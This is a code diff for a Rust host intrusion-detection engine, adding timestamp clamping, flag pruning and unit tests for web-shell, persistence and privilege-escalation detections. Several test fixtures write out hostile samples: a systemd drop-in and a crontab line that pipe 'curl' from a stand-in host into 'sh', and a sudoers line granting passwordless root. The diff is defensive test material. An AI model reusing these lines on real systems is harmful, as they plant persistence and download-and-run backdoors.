@@ -20,6 +20,10 @@ const FLAG_TTL_SECS: i64 = 600;
 const TREE_RETENTION_HOURS: i64 = 48;
 /// Idle auth sources are forgotten after this long.
 const BURST_RETENTION_SECS: i64 = 3600;
+/// Event timestamps further ahead of the wall clock than this are clamped.
+pub const MAX_FUTURE_SKEW_SECS: i64 = 60;
+/// Upper bound on remembered D1 flags; the oldest are dropped first.
+const MAX_FLAGS: usize = 4096;
 
 #[derive(Debug, Clone, Default, serde::Serialize, serde::Deserialize)]
 pub struct Counters {
@@ -72,8 +76,9 @@ fn day_key(now: DateTime<Utc>) -> String {
 }
 
 impl Engine {
-    pub fn new(cfg: Config, allowlist: Allowlist, baseline: Baseline, host: String) -> Self {
+    pub fn new(cfg: Config, allowlist: Allowlist, mut baseline: Baseline, host: String) -> Self {
         let now = Utc::now();
+        baseline.migrate_connectors(now);
         let dedup_window = cfg.notifications.dedup_window_secs;
         let counters = Counters {
             day: day_key(now),
@@ -141,6 +146,22 @@ impl Engine {
     }
 
     pub fn process(&mut self, ev: Event) -> Vec<Alert> {
+        self.process_at(ev, Utc::now())
+    }
+
+    /// Like [`process`](Self::process) with an explicit wall clock.
+    ///
+    /// Event timestamps come from logs and collectors and can be wrong (a
+    /// syslog line with the wrong year, a clock step). A timestamp in the
+    /// future used to set dedup/flag/baseline state ahead of real time, which
+    /// suppressed that signature until the clock caught up and stopped flag
+    /// pruning. Timestamps more than [`MAX_FUTURE_SKEW_SECS`] ahead of
+    /// `wall` are clamped to `wall`.
+    pub fn process_at(&mut self, mut ev: Event, wall: DateTime<Utc>) -> Vec<Alert> {
+        let limit = wall + Duration::seconds(MAX_FUTURE_SKEW_SECS);
+        if ev.ts() > limit {
+            ev.set_ts(wall);
+        }
         self.counters.record_event();
         let now = ev.ts();
         self.counters.roll_day(&day_key(now));
@@ -167,14 +188,9 @@ impl Engine {
                     findings.extend(detect::d5::evaluate_connect(&e, &self.ctx(now)));
                 }
                 self.baseline.observe_dest(e.daddr, now);
-                let root_exe = self
-                    .tree
-                    .chain_of(e.pid)
-                    .first()
-                    .map(|p| p.exe.clone())
-                    .unwrap_or_else(|| e.comm.clone());
+                let exe = detect::d5::connector_exe(&self.tree, e.pid, &e.comm);
                 self.baseline
-                    .observe_connector(&detect::d5::connector_key(&root_exe, e.uid), now);
+                    .observe_connector(&detect::d5::connector_key(&exe, e.uid), now);
             }
             Event::Ptrace(e) => {
                 if self.cfg.detections.d4_priv_esc {
@@ -271,6 +287,13 @@ impl Engine {
         alerts
     }
 
+    /// Tell the engine which pids exist right now (the daemon reads /proc).
+    /// Exited processes stop counting as live sessions and are dropped from
+    /// the tree after a short grace period.
+    pub fn reap_exited(&mut self, alive: &std::collections::HashSet<u32>, now: DateTime<Utc>) {
+        self.tree.reap(alive, now);
+    }
+
     /// Forget a listener so it will alert again if it reappears (called when
     /// the daemon observes the port closing).
     pub fn forget_listener(&mut self, proto: &str, port: u16) {
@@ -331,12 +354,12 @@ impl Engine {
     }
 
     fn prune_flags(&mut self, now: DateTime<Utc>) {
-        while self
-            .flags
-            .front()
-            .map(|f| now - f.ts > Duration::seconds(FLAG_TTL_SECS))
-            .unwrap_or(false)
-        {
+        // Not just the front: flags aren't guaranteed to be in time order
+        // (event timestamps can arrive out of order), and one young flag at
+        // the front used to shield every expired flag behind it.
+        let ttl = Duration::seconds(FLAG_TTL_SECS);
+        self.flags.retain(|f| now - f.ts <= ttl);
+        while self.flags.len() > MAX_FLAGS {
             self.flags.pop_front();
         }
     }
@@ -440,6 +463,13 @@ mod tests {
             exe: format!("/usr/bin/{}", comm),
             tty_nr,
         }
+    }
+
+    /// Process an event as if the wall clock were at the event's own time,
+    /// for tests that step time forward.
+    fn at(eng: &mut Engine, ev: Event) -> Vec<Alert> {
+        let ts = ev.ts();
+        eng.process_at(ev, ts)
     }
 
     fn has(alerts: &[Alert], d: DetectionId, s: Severity) -> bool {
@@ -560,6 +590,81 @@ mod tests {
             .unwrap_or_else(|| panic!("{:?}", b));
         let comms: Vec<&str> = crit.chain.iter().map(|n| n.comm.as_str()).collect();
         assert_eq!(comms, vec!["systemd", "nginx", "bash", ".x.sh"]);
+    }
+
+    #[test]
+    fn curl_pipe_sh_from_a_web_shell_is_critical() {
+        // Realistic shape: the payload is the downloader's sibling.
+        let mut eng = engine_without_baseline();
+        let t = Utc::now();
+        eng.process(exec(t, 1, 0, 0, "systemd", "/usr/lib/systemd/systemd"));
+        eng.process(exec(t, 100, 1, 33, "nginx", "/usr/sbin/nginx"));
+        eng.process(exec(t, 200, 100, 33, "sh", "/usr/bin/dash"));
+        eng.process(exec(t, 300, 200, 33, "curl", "/usr/bin/curl"));
+        let piped = eng.process(exec(t, 301, 200, 33, "sh", "/usr/bin/dash"));
+        assert!(
+            has(&piped, DetectionId::D1, Severity::Critical),
+            "{:?}",
+            piped
+        );
+    }
+
+    #[test]
+    fn curl_then_run_from_a_web_shell_is_critical() {
+        let mut eng = engine_without_baseline();
+        let t = Utc::now();
+        eng.process(exec(t, 1, 0, 0, "systemd", "/usr/lib/systemd/systemd"));
+        eng.process(exec(t, 100, 1, 33, "php-fpm", "/usr/sbin/php-fpm8.2"));
+        eng.process(exec(t, 200, 100, 33, "sh", "/usr/bin/dash"));
+        eng.process(exec(t, 300, 200, 33, "wget", "/usr/bin/wget"));
+        let run = eng.process(exec(
+            t + Duration::seconds(3),
+            301,
+            200,
+            33,
+            "x",
+            "/var/www/html/uploads/x",
+        ));
+        assert!(has(&run, DetectionId::D1, Severity::Critical), "{:?}", run);
+        // Ordinary tools in the same shell aren't escalated.
+        let grep = eng.process(exec(t, 302, 200, 33, "grep", "/usr/bin/grep"));
+        assert!(
+            !has(&grep, DetectionId::D1, Severity::Critical),
+            "{:?}",
+            grep
+        );
+    }
+
+    #[test]
+    fn web_server_children_beyond_shells() {
+        let mut eng = engine_without_baseline();
+        let t = Utc::now();
+        eng.process(exec(t, 1, 0, 0, "systemd", "/usr/lib/systemd/systemd"));
+        eng.process(exec(t, 100, 1, 33, "nginx", "/usr/sbin/nginx"));
+        let nc = eng.process(exec(t, 201, 100, 33, "nc", "/usr/bin/nc.openbsd"));
+        assert!(has(&nc, DetectionId::D1, Severity::High), "{:?}", nc);
+        let curl = eng.process(exec(t, 202, 100, 33, "curl", "/usr/bin/curl"));
+        assert!(has(&curl, DetectionId::D1, Severity::High), "{:?}", curl);
+        let py = eng.process(exec(t, 203, 100, 33, "python3", "/usr/bin/python3.12"));
+        assert!(has(&py, DetectionId::D1, Severity::Low), "{:?}", py);
+        assert!(!has(&py, DetectionId::D1, Severity::High));
+    }
+
+    #[test]
+    fn wrappers_between_web_server_and_shell_are_seen_through() {
+        let mut eng = engine_without_baseline();
+        let t = Utc::now();
+        eng.process(exec(t, 1, 0, 0, "systemd", "/usr/lib/systemd/systemd"));
+        eng.process(exec(t, 100, 1, 33, "nginx", "/usr/sbin/nginx"));
+        eng.process(exec(t, 200, 100, 33, "env", "/usr/bin/env"));
+        // env execs sh in the same pid.
+        let a = eng.process(exec(t, 200, 100, 33, "sh", "/usr/bin/dash"));
+        assert!(has(&a, DetectionId::D1, Severity::High), "{:?}", a);
+        // setsid as a separate process (another worker, so dedup doesn't hide it).
+        eng.process(exec(t, 110, 1, 33, "nginx", "/usr/sbin/nginx"));
+        eng.process(exec(t, 300, 110, 33, "setsid", "/usr/bin/setsid"));
+        let b = eng.process(exec(t, 301, 300, 33, "bash", "/usr/bin/bash"));
+        assert!(has(&b, DetectionId::D1, Severity::High), "{:?}", b);
     }
 
     #[test]
@@ -719,14 +824,17 @@ mod tests {
         let mut baseline = Baseline::new(true, 24, Utc::now());
         baseline.complete = true;
         let mut eng = Engine::new(cfg, Allowlist::default(), baseline, "h".into());
-        let alerts = eng.process(Event::Auth(AuthEvent {
-            ts: Utc::now().with_hour(12).unwrap(),
-            result: AuthResult::Success,
-            user: "deploy".into(),
-            rhost: Some("203.0.113.9".parse().unwrap()),
-            service: "sshd".into(),
-            tty: "ssh".into(),
-        }));
+        let alerts = at(
+            &mut eng,
+            Event::Auth(AuthEvent {
+                ts: Utc::now().with_hour(12).unwrap(),
+                result: AuthResult::Success,
+                user: "deploy".into(),
+                rhost: Some("203.0.113.9".parse().unwrap()),
+                service: "sshd".into(),
+                tty: "ssh".into(),
+            }),
+        );
         assert!(has(&alerts, DetectionId::D2, Severity::Low), "{:?}", alerts);
     }
 
@@ -878,6 +986,31 @@ mod tests {
     }
 
     #[test]
+    fn systemd_dropin_overriding_execstart_is_critical() {
+        let mut eng = engine_without_baseline();
+        let t = Utc::now();
+        eng.process(exec(t, 1, 0, 0, "systemd", "/usr/lib/systemd/systemd"));
+        eng.process(exec(t, 400, 1, 0, "cron", "/usr/sbin/cron"));
+        let alerts = eng.process(Event::File(file(
+            t,
+            "/etc/systemd/system/ssh.service.d/override.conf",
+            FileKind::Created,
+            None,
+            Some("[Service]\nExecStart=\nExecStartPre=/usr/bin/true\nExecStartPost=/bin/sh -c 'curl -s http://198.51.100.1/x | sh'\n"),
+        )));
+        let a = alerts
+            .iter()
+            .find(|a| a.detection == DetectionId::D3 && a.severity == Severity::Critical)
+            .unwrap_or_else(|| panic!("{:?}", alerts));
+        assert!(a.title.contains("drop-in"), "{}", a.title);
+        assert!(
+            a.facts.iter().any(|f| f.value.contains("curl")),
+            "{:?}",
+            a.facts
+        );
+    }
+
+    #[test]
     fn package_installed_systemd_unit_is_silent() {
         let mut eng = engine_without_baseline();
         let mut ev = file(
@@ -889,6 +1022,110 @@ mod tests {
         );
         ev.managed_by_package = Some(true);
         assert!(eng.process(Event::File(ev)).is_empty());
+    }
+
+    #[test]
+    fn binaries_named_like_trusted_tools_get_no_exemption() {
+        let mut eng = engine_without_baseline();
+        let t = Utc::now();
+        eng.process(exec(t, 1, 0, 0, "systemd", "/usr/lib/systemd/systemd"));
+        eng.process(exec(t, 400, 1, 0, "cron", "/usr/sbin/cron"));
+        let fake = |pid, comm: &str| WriterInfo {
+            pid,
+            uid: 0,
+            comm: comm.into(),
+            exe: format!("/tmp/{}", comm),
+            tty_nr: 0,
+        };
+        eng.process(exec(t, 500, 400, 0, "dpkg", "/tmp/dpkg"));
+        let cron = eng.process(Event::File(file(
+            t,
+            "/etc/cron.d/evil",
+            FileKind::Created,
+            Some(fake(500, "dpkg")),
+            Some("* * * * * root /opt/evil.sh\n"),
+        )));
+        assert!(has(&cron, DetectionId::D3, Severity::High), "{:?}", cron);
+
+        eng.process(exec(t, 501, 400, 0, "crontab", "/tmp/crontab"));
+        let spool = eng.process(Event::File(file(
+            t,
+            "/var/spool/cron/crontabs/root",
+            FileKind::Modified,
+            Some(fake(501, "crontab")),
+            Some("* * * * * /opt/evil.sh\n"),
+        )));
+        assert!(has(&spool, DetectionId::D3, Severity::High), "{:?}", spool);
+
+        eng.process(exec(t, 502, 400, 0, "visudo", "/tmp/visudo"));
+        let sudo = eng.process(Event::File(file(
+            t,
+            "/etc/sudoers.d/99-x",
+            FileKind::Created,
+            Some(fake(502, "visudo")),
+            Some("mallory ALL=(ALL) NOPASSWD: ALL\n"),
+        )));
+        assert!(
+            has(&sudo, DetectionId::D4, Severity::Critical),
+            "{:?}",
+            sudo
+        );
+    }
+
+    #[test]
+    fn real_tools_run_from_a_web_shell_get_no_exemption() {
+        // (crontab -l; echo '* * * * * curl x|sh') | crontab -   from php-fpm.
+        let mut eng = engine_without_baseline();
+        let t = Utc::now();
+        eng.process(exec(t, 1, 0, 0, "systemd", "/usr/lib/systemd/systemd"));
+        eng.process(exec(t, 100, 1, 33, "php-fpm", "/usr/sbin/php-fpm8.2"));
+        eng.process(exec(t, 200, 100, 33, "sh", "/usr/bin/dash"));
+        eng.process(exec(t, 300, 200, 33, "crontab", "/usr/bin/crontab"));
+        let cron = eng.process(Event::File(file(
+            t,
+            "/var/spool/cron/crontabs/www-data",
+            FileKind::Modified,
+            Some(writer(300, 33, "crontab", 0)),
+            Some("* * * * * curl -s http://198.51.100.1/x | sh\n"),
+        )));
+        assert!(
+            has(&cron, DetectionId::D3, Severity::Critical),
+            "{:?}",
+            cron
+        );
+
+        // usermod -p <hash> root, the writer gone by the time inotify fires.
+        eng.process(exec(t, 301, 200, 0, "usermod", "/usr/sbin/usermod"));
+        let shadow = eng.process(Event::File(file(
+            t + Duration::seconds(1),
+            "/etc/shadow",
+            FileKind::MovedTo,
+            None,
+            None,
+        )));
+        assert!(
+            has(&shadow, DetectionId::D4, Severity::Critical),
+            "{:?}",
+            shadow
+        );
+    }
+
+    #[test]
+    fn admin_tools_from_a_session_stay_exempt() {
+        let mut eng = engine_without_baseline();
+        let t = Utc::now();
+        eng.process(exec(t, 1, 0, 0, "systemd", "/usr/lib/systemd/systemd"));
+        eng.process(exec(t, 50, 1, 0, "sshd", "/usr/sbin/sshd"));
+        eng.process(exec(t, 60, 50, 1000, "bash", "/usr/bin/bash"));
+        eng.process(exec(t, 70, 60, 1000, "crontab", "/usr/bin/crontab"));
+        let a = eng.process(Event::File(file(
+            t,
+            "/var/spool/cron/crontabs/dev",
+            FileKind::Modified,
+            Some(writer(70, 1000, "crontab", 1)),
+            Some("0 3 * * * /usr/bin/backup\n"),
+        )));
+        assert!(a.is_empty(), "{:?}", a);
     }
 
     // ---- D4 -------------------------------------------------------------
@@ -964,6 +1201,13 @@ mod tests {
         assert!(eng.process(mk(501, "gdb", 16)).is_empty());
         // Non-attach requests are ignored.
         assert!(eng.process(mk(502, "weird", 3)).is_empty());
+        // A binary merely named gdb is still an unexpected attacher.
+        eng.process(exec(t, 503, 1, 1000, "gdb", "/dev/shm/gdb"));
+        assert!(has(
+            &eng.process(mk(503, "gdb", 16)),
+            DetectionId::D4,
+            Severity::High
+        ));
     }
 
     #[test]
@@ -984,13 +1228,16 @@ mod tests {
         )));
         assert!(alerts.is_empty(), "{:?}", alerts);
         // Same rename 60s later with nothing recent is unattended tampering.
-        let later = eng.process(Event::File(file(
-            t + Duration::seconds(400),
-            "/etc/shadow",
-            FileKind::MovedTo,
-            None,
-            None,
-        )));
+        let later = at(
+            &mut eng,
+            Event::File(file(
+                t + Duration::seconds(400),
+                "/etc/shadow",
+                FileKind::MovedTo,
+                None,
+                None,
+            )),
+        );
         assert!(
             has(&later, DetectionId::D4, Severity::Critical),
             "{:?}",
@@ -1044,6 +1291,39 @@ mod tests {
 
     #[test]
     fn dns_connects_are_ignored() {
+        let mut baseline = Baseline::new(true, 24, Utc::now());
+        baseline.complete = true;
+        let mut eng = Engine::new(
+            Config::default(),
+            Allowlist::default(),
+            baseline,
+            "h".into(),
+        );
+        let t = Utc::now();
+        eng.process(exec(t, 1, 0, 0, "systemd", "/usr/lib/systemd/systemd"));
+        eng.process(exec(
+            t,
+            150,
+            1,
+            101,
+            "resolved",
+            "/usr/lib/systemd/resolved",
+        ));
+        let alerts = eng.process(Event::Connect(ConnectEvent {
+            ts: t,
+            pid: 150,
+            uid: 101,
+            daddr: "1.1.1.1".parse().unwrap(),
+            dport: 53,
+            comm: "resolved".into(),
+            container: false,
+        }));
+        assert!(alerts.is_empty(), "{:?}", alerts);
+    }
+
+    #[test]
+    fn flagged_chain_to_dns_port_still_fires() {
+        // A reverse shell to attacker:53 must not hide behind the infra-port skip.
         let mut eng = engine_without_baseline();
         let t = Utc::now();
         eng.process(exec(t, 100, 1, 33, "nginx", "/usr/sbin/nginx"));
@@ -1052,12 +1332,16 @@ mod tests {
             ts: t,
             pid: 200,
             uid: 33,
-            daddr: "1.1.1.1".parse().unwrap(),
+            daddr: "198.51.100.42".parse().unwrap(),
             dport: 53,
             comm: "bash".into(),
             container: false,
         }));
-        assert!(alerts.is_empty(), "{:?}", alerts);
+        assert!(
+            has(&alerts, DetectionId::D5, Severity::High),
+            "{:?}",
+            alerts
+        );
     }
 
     #[test]
@@ -1067,10 +1351,13 @@ mod tests {
         baseline.complete = true;
         let mut eng = Engine::new(cfg, Allowlist::default(), baseline, "h".into());
         let t = Utc::now();
-        eng.process(exec(t, 100, 1, 33, "nginx", "/usr/sbin/nginx"));
+        // Realistic tree: PID 1 is present, as the daemon seeds it from /proc.
+        eng.process(exec(t, 1, 0, 0, "systemd", "/usr/lib/systemd/systemd"));
+        eng.process(exec(t, 100, 1, 0, "nginx", "/usr/sbin/nginx"));
+        eng.process(exec(t, 101, 100, 33, "nginx", "/usr/sbin/nginx"));
         let alerts = eng.process(Event::Connect(ConnectEvent {
             ts: t,
-            pid: 100,
+            pid: 101,
             uid: 33,
             daddr: "198.51.100.99".parse().unwrap(),
             dport: 8443,
@@ -1082,6 +1369,49 @@ mod tests {
             "{:?}",
             alerts
         );
+    }
+
+    #[test]
+    fn first_connect_is_keyed_on_the_connecting_program() {
+        let t = Utc::now();
+        let mut baseline = Baseline::new(true, 24, t);
+        let mut eng = Engine::new(
+            Config::default(),
+            Allowlist::default(),
+            baseline.clone(),
+            "h".into(),
+        );
+        let connect = |pid: u32, comm: &str, ts| {
+            Event::Connect(ConnectEvent {
+                ts,
+                pid,
+                uid: 0,
+                daddr: "10.0.0.5".parse().unwrap(),
+                dport: 5432,
+                comm: comm.into(),
+                container: false,
+            })
+        };
+        eng.process(exec(t, 1, 0, 0, "systemd", "/usr/lib/systemd/systemd"));
+        eng.process(exec(t, 200, 1, 0, "backup", "/usr/local/bin/backup"));
+        eng.process(connect(200, "backup", t));
+        baseline = eng.baseline.clone();
+        baseline.complete = true;
+        eng.baseline = baseline;
+        // A different program under the same PID 1 root is still new.
+        eng.process(exec(t, 300, 1, 0, "implant", "/usr/local/bin/implant"));
+        let later = t + Duration::hours(1);
+        let alerts = eng.process(connect(300, "implant", later));
+        assert!(
+            alerts
+                .iter()
+                .any(|a| a.title == "First outbound connection from a program"),
+            "{:?}",
+            alerts
+        );
+        // The learned one stays quiet.
+        let again = eng.process(connect(200, "backup", later));
+        assert!(again.is_empty(), "{:?}", again);
     }
 
     #[test]
@@ -1103,14 +1433,17 @@ mod tests {
         eng.forget_listener("tcp", 4444);
         // dedup window still open, so still suppressed by dedup - advance time.
         let later = t + Duration::seconds(400);
-        let alerts = eng.process(Event::Listener(ListenerEvent {
-            ts: later,
-            proto: "tcp".into(),
-            addr: "0.0.0.0".parse().unwrap(),
-            port: 4444,
-            pid: 0,
-            comm: "x".into(),
-        }));
+        let alerts = at(
+            &mut eng,
+            Event::Listener(ListenerEvent {
+                ts: later,
+                proto: "tcp".into(),
+                addr: "0.0.0.0".parse().unwrap(),
+                port: 4444,
+                pid: 0,
+                comm: "x".into(),
+            }),
+        );
         assert_eq!(alerts.len(), 1);
     }
 
@@ -1163,6 +1496,50 @@ mod tests {
         assert!(eng
             .alert_from(finding(Severity::Critical, "now critical"), t)
             .is_some());
+    }
+
+    #[test]
+    fn future_timestamps_do_not_blind_dedup() {
+        let mut eng = engine_without_baseline();
+        let wall = Utc::now();
+        eng.process_at(exec(wall, 100, 1, 33, "nginx", "/usr/sbin/nginx"), wall);
+        // A bogus event dated a year ahead creates the dedup entry...
+        let bogus = eng.process_at(
+            exec(
+                wall + Duration::days(365),
+                200,
+                100,
+                33,
+                "bash",
+                "/usr/bin/bash",
+            ),
+            wall,
+        );
+        assert!(has(&bogus, DetectionId::D1, Severity::High));
+        // ...and ten minutes later (past the window) the same signature must
+        // alert again, not stay suppressed for a year.
+        let later = wall + Duration::seconds(600);
+        let again = eng.process_at(exec(later, 200, 100, 33, "bash", "/usr/bin/bash"), later);
+        assert!(has(&again, DetectionId::D1, Severity::High), "{:?}", again);
+    }
+
+    #[test]
+    fn expired_flags_are_pruned_behind_a_young_one() {
+        let mut eng = engine_without_baseline();
+        let wall = Utc::now();
+        let flag = |ts| FlaggedChain {
+            pids: vec![1234],
+            detection: DetectionId::D1,
+            severity: Severity::High,
+            ts,
+            reason: "x".into(),
+        };
+        eng.flags.push_back(flag(wall));
+        for _ in 0..10 {
+            eng.flags.push_back(flag(wall - Duration::hours(2)));
+        }
+        eng.tick(wall);
+        assert_eq!(eng.flags.len(), 1);
     }
 
     #[test]
